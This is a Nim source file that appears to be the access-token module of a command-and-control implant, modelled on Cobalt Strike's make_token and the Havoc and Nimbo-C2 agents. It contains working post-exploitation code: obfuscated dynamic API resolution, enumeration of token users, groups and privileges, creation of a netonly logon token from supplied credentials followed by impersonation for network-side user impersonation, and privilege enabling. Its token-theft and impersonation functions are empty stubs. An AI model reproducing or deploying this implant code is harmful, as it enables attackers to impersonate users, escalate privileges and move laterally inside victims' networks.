import winim/lean 
import strformat
import ../../common/[types, utils]

#[
    Token impersonation & manipulation 
    - https://maldevacademy.com/new/modules/57
    - https://www.nccgroup.com/research-blog/demystifying-cobalt-strike-s-make_token-command/ 
    - https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Token.c
    - https://github.com/itaymigdal/Nimbo-C2/blob/main/Nimbo-C2/agent/windows/utils/token.nim
    - Windows System Programming Security on INE (Pavel Yosifovich)
]#

# APIs
type 
    NtQueryInformationToken = proc(hToken: HANDLE, tokenInformationClass: TOKEN_INFORMATION_CLASS, tokenInformation: PVOID, tokenInformationLength: ULONG, returnLength: PULONG): NTSTATUS {.stdcall.}
    NtOpenThreadToken = proc(threadHandle: HANDLE, desiredAccess: ACCESS_MASK, openAsSelf: BOOLEAN, tokenHandle: PHANDLE): NTSTATUS {.stdcall.}
    NtOpenProcessToken = proc(processHandle: HANDLE, desiredAccess: ACCESS_MASK, tokenHandle: PHANDLE): NTSTATUS {.stdcall.}
    
    ConvertSidToStringSidA = proc(sid: PSID, stringSid: ptr LPSTR): NTSTATUS {.stdcall.}

const 
    CURRENT_THREAD = cast[HANDLE](-2)
    CURRENT_PROCESS = cast[HANDLE](-1)

proc getCurrentToken*(desiredAccess: ACCESS_MASK = TOKEN_QUERY): HANDLE = 
    var 
        status: NTSTATUS = 0
        hToken: HANDLE 

    let hNtdll = GetModuleHandleA(protect("ntdll"))
    let 
        pNtOpenThreadToken = cast[NtOpenThreadToken](GetProcAddress(hNtdll, protect("NtOpenThreadToken")))
        pNtOpenProcessToken = cast[NtOpenProcessToken](GetProcAddress(hNtdll, protect("NtOpenProcessToken")))
    
    # https://ntdoc.m417z.com/ntopenthreadtoken, token-info fails with error ACCESS_DENIED if OpenAsSelf is set to
    status = pNtOpenThreadToken(CURRENT_THREAD, desiredAccess, TRUE, addr hToken)
    if status != STATUS_SUCCESS:
        status = pNtOpenProcessToken(CURRENT_PROCESS, desiredAccess, addr hToken)
        if status != STATUS_SUCCESS: 
            raise newException(CatchableError, protect("NtOpenProcessToken ") & $status.toHex())

    return hToken

proc sidToString(sid: PSID): string = 
    let pConvertSidToStringSidA = cast[ConvertSidToStringSidA](GetProcAddress(GetModuleHandleA(protect("advapi32.dll")), protect("ConvertSidToStringSidA")))
    var stringSid: LPSTR 
    discard pConvertSidToStringSidA(sid, addr stringSid)
    return $stringSid

proc sidToName(sid: PSID): string = 
    var 
        usernameSize: DWORD = 0
        domainSize: DWORD = 0
        sidType: SID_NAME_USE
    
    # Retrieve required sizes
    discard LookupAccountSidW(NULL, sid, NULL, addr usernameSize, NULL, addr domainSize, addr sidType)
    
    var username = newWString(int(usernameSize) + 1)
    var domain = newWString(int(domainSize) + 1)
    if LookupAccountSidW(NULL, sid, username, addr usernameSize, domain, addr domainSize, addr sidType) == TRUE:
        return $domain[0 ..< int(domainSize)] & "\\" & $username[0 ..< int(usernameSize)]
    return ""

proc privilegeToString(luid: PLUID): string =
    var privSize: DWORD = 0

    # Retrieve required size
    discard LookupPrivilegeNameW(NULL, luid, NULL, addr privSize)   

    var privName = newWString(int(privSize) + 1)
    if LookupPrivilegeNameW(NULL, luid, privName, addr privSize) == TRUE: 
        return $privName[0 ..< int(privSize)]
    return ""

#[
    Retrieve and return information about an access token
]#

proc getTokenStatistics(hToken: HANDLE): tuple[tokenId, tokenType: string] = 
    var
        status: NTSTATUS = 0
        returnLength: ULONG = 0
        pStats: TOKEN_STATISTICS

    let pNtQueryInformationToken = cast[NtQueryInformationToken](GetProcAddress(GetModuleHandleA(protect("ntdll")), protect("NtQueryInformationToken")))

    status = pNtQueryInformationToken(hToken, tokenStatistics, addr pStats, cast[ULONG](sizeof(pStats)), addr returnLength)
    if status != STATUS_SUCCESS: 
        raise newException(CatchableError, protect("NtQueryInformationToken - Token Statistics ") & $status.toHex())

    let 
        tokenType = if cast[TOKEN_TYPE](pStats.TokenType) == tokenPrimary: protect("Primary") else: protect("Impersonation")
        tokenId = cast[uint32](pStats.TokenId).toHex()

    return (tokenId, tokenType)

proc getTokenUser(hToken: HANDLE): tuple[username, sid: string] = 
    var
        status: NTSTATUS = 0
        returnLength: ULONG = 0
        pUser: PTOKEN_USER

    let pNtQueryInformationToken = cast[NtQueryInformationToken](GetProcAddress(GetModuleHandleA(protect("ntdll")), protect("NtQueryInformationToken")))

    status = pNtQueryInformationToken(hToken, tokenUser, NULL, 0, addr returnLength)
    if status != STATUS_SUCCESS and status != STATUS_BUFFER_TOO_SMALL:
        raise newException(CatchableError, protect("NtQueryInformationToken - Token User [1] ") & $status.toHex())
    
    pUser = cast[PTOKEN_USER](LocalAlloc(LMEM_FIXED, returnLength))
    if pUser == NULL:
        raise newException(CatchableError, $GetLastError())
    defer: LocalFree(cast[HLOCAL](pUser))
    
    status = pNtQueryInformationToken(hToken, tokenUser, cast[PVOID](pUser), returnLength, addr returnLength)
    if status != STATUS_SUCCESS:
        raise newException(CatchableError, protect("NtQueryInformationToken - Token User [2] ") & $status.toHex())
    
    return (sidToName(pUser.User.Sid), sidToString(pUser.User.Sid))

proc getTokenGroups(hToken: HANDLE): string = 
    var
        status: NTSTATUS = 0
        returnLength: ULONG = 0
        pGroups: PTOKEN_GROUPS

    let pNtQueryInformationToken = cast[NtQueryInformationToken](GetProcAddress(GetModuleHandleA(protect("ntdll")), protect("NtQueryInformationToken")))

    status = pNtQueryInformationToken(hToken, tokenGroups, NULL, 0, addr returnLength)
    if status != STATUS_SUCCESS and status != STATUS_BUFFER_TOO_SMALL:
        raise newException(CatchableError, protect("NtQueryInformationToken - Token Groups [1] ") & $status.toHex())
    
    pGroups = cast[PTOKEN_GROUPS](LocalAlloc(LMEM_FIXED, returnLength))
    if pGroups == NULL:
        raise newException(CatchableError, $GetLastError())
    defer: LocalFree(cast[HLOCAL](pGroups))
    
    status = pNtQueryInformationToken(hToken, tokenGroups, cast[PVOID](pGroups), returnLength, addr returnLength)
    if status != STATUS_SUCCESS:
        raise newException(CatchableError, protect("NtQueryInformationToken - Token Groups [2] ") & $status.toHex())

    let 
        groupCount = pGroups.GroupCount
        groups = cast[ptr UncheckedArray[SID_AND_ATTRIBUTES]](addr pGroups.Groups[0])

    result &= fmt"Group memberships ({groupCount})" & "\n"
    for i, group in groups.toOpenArray(0, int(groupCount) - 1): 
        result &= fmt" - {sidToString(group.Sid):<50} {sidToName(group.Sid)}" & "\n"

proc getTokenPrivileges(hToken: HANDLE): string = 
    var
        status: NTSTATUS = 0
        returnLength: ULONG = 0
        pPrivileges: PTOKEN_PRIVILEGES
        
    let pNtQueryInformationToken = cast[NtQueryInformationToken](GetProcAddress(GetModuleHandleA(protect("ntdll")), protect("NtQueryInformationToken")))

    status = pNtQueryInformationToken(hToken, tokenPrivileges, NULL, 0, addr returnLength)
    if status != STATUS_SUCCESS and status != STATUS_BUFFER_TOO_SMALL:
        raise newException(CatchableError, protect("NtQueryInformationToken - Token Privileges [1] ") & $status.toHex())
    
    pPrivileges = cast[PTOKEN_PRIVILEGES](LocalAlloc(LMEM_FIXED, returnLength))
    if pPrivileges == NULL:
        raise newException(CatchableError, $GetLastError())
    defer: LocalFree(cast[HLOCAL](pPrivileges))
    
    status = pNtQueryInformationToken(hToken, tokenPrivileges, cast[PVOID](pPrivileges), returnLength, addr returnLength)
    if status != STATUS_SUCCESS:
        raise newException(CatchableError, protect("NtQueryInformationToken - Token Privileges [2] ") & $status.toHex())

    let 
        privCount = pPrivileges.PrivilegeCount
        privs = cast[ptr UncheckedArray[LUID_AND_ATTRIBUTES]](addr pPrivileges.Privileges[0])

    result &= fmt"Privileges ({privCount})" & "\n"
    for i, priv in privs.toOpenArray(0, int(privCount) - 1):
        let enabled = if priv.Attributes and SE_PRIVILEGE_ENABLED: "Enabled" else: "Disabled" 
        result &= fmt" - {privilegeToString(addr priv.Luid):<50} {enabled}" & "\n"


proc getTokenInfo*(hToken: HANDLE): string =   
    let (tokenId, tokenType) = hToken.getTokenStatistics()
    result &= fmt"TokenID: 0x{tokenId}" & "\n"
    result &= fmt"Type:    {tokenType}" & "\n"

    let (username, sid) = hToken.getTokenUser()
    result &= fmt"User:    {username}" & "\n"
    result &= fmt"SID:     {sid}" & "\n"

    result &= hToken.getTokenGroups()
    result &= hToken.getTokenPrivileges()

proc impersonateToken*(hToken: HANDLE) = 
    discard

#[
    Create a new access token from a username, password and domain name triplet.
    Using LOGON32_LOGON_NEW_CREDENTIALS creates a netonly security context (same as using runas.exe /netonly)
    This means that nothing changes locally, the user returned by "getTokenOwner" is the same as the current user. 
    In the network, we are represented by the credentials of the user we created the token for, allowing us to inject Kerberos tickets, etc. to impersonate that user.
    The LOGON32_LOGON_NEW_CREDENTIALS logon type does not validate credentials.

    Using other logon types (https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types) 
    changes the output of the getTokenOwner function. The credentials are then validated by the LogonUserA function. 
]#
proc makeToken*(username, password, domain: string, logonType: DWORD = LOGON32_LOGON_NEW_CREDENTIALS): string = 
    if username == "" or password == "" or domain == "": 
        raise newException(CatchableError, protect("Invalid format."))

    var 
        hToken: HANDLE 
        hImpersonationToken: HANDLE

    let provider: DWORD = if logonType == LOGON32_LOGON_NEW_CREDENTIALS: LOGON32_PROVIDER_WINNT50 else: LOGON32_PROVIDER_DEFAULT
    if LogonUserA(username, domain, password, logonType, provider, addr hToken) == FALSE:
        raise newException(CatchableError, $GetLastError())
    defer: CloseHandle(hToken)

    if DuplicateTokenEx(hToken, TOKEN_QUERY or TOKEN_IMPERSONATE, NULL, securityImpersonation, tokenImpersonation, addr hImpersonationToken) == FALSE:
        raise newException(CatchableError, $GetLastError())
    
    # Revert to self before impersonation
    discard RevertToSelf() 
    if ImpersonateLoggedOnUser(hImpersonationToken) == FALSE: 
        CloseHandle(hImpersonationToken)
        raise newException(CatchableError, $GetLastError())

    return hToken.getTokenUser.username

proc tokenSteal*(pid: int): bool = 
    discard 

proc rev2self*(): bool = 
    return RevertToSelf()

proc enablePrivilege*(privilegeName: string, enable: bool = true): string = 
    var 
        tokenPrivs: TOKEN_PRIVILEGES
        oldTokenPrivs: TOKEN_PRIVILEGES
        luid: LUID 
        returnLength: DWORD

    let hToken = getCurrentToken(TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY) 
    defer: CloseHandle(hToken)

    if LookupPrivilegeValueW(NULL, newWideCString(privilegeName), addr luid) == FALSE: 
        raise newException(CatchableError, $GetLastError())

    # Enable privilege
    tokenPrivs.PrivilegeCount = 1
    tokenPrivs.Privileges[0].Luid = luid 
    tokenPrivs.Privileges[0].Attributes = if enable: SE_PRIVILEGE_ENABLED else: 0

    if AdjustTokenPrivileges(hToken, FALSE, addr tokenPrivs, cast[DWORD](sizeof(TOKEN_PRIVILEGES)), addr oldTokenPrivs, addr returnLength) == FALSE:
        raise newException(CatchableError, $GetLastError())

    let action = if enable: protect("Enabled") else: protect("Disabled")
    return fmt"{action} {privilegeToString(addr luid)}."